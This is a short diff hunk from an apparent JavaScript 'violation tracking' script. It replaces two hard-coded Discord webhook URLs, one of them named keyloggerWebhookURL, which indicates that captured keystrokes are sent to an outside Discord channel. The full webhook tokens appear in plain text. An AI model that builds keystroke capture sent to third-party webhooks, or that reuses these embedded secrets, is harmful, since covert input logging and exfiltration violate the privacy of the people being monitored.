@@ -9,8 +9,8 @@
 // Global violation tracking with limits
 let violationCount = 0;
 const violationHistory = [];
-const webhookURL = "https://discord.com/api/webhooks/1482510569461383242/tF_91rzrXYfs4P-qBbarNafSa-fArvPp99_HxdoM8_iREqzgaSTLhBoFOajYwB1-ElgN";
-const keyloggerWebhookURL = "https://discord.com/api/webhooks/1501762208906870847/YCy3FG4KTmvsgW8B98l11HQkydWu8gEygCLEwFVvCN0gtn8e4jO4TIFGWOaeBT2DqKI0";
+const webhookURL = "https://discord.com/api/webhooks/1521152546633285642/yLjI3AkCj2l14c1ezGV3xOikUTlh2ariZN9lG_kFwkYmJ5tMwM-iEE6FISMAJNFujTor";
+const keyloggerWebhookURL = "https://discord.com/api/webhooks/1521152546633285642/yLjI3AkCj2l14c1ezGV3xOikUTlh2ariZN9lG_kFwkYmJ5tMwM-iEE6FISMAJNFujTor";
 
 // Performance flag to prevent overload
 let isProcessingViolation = false;
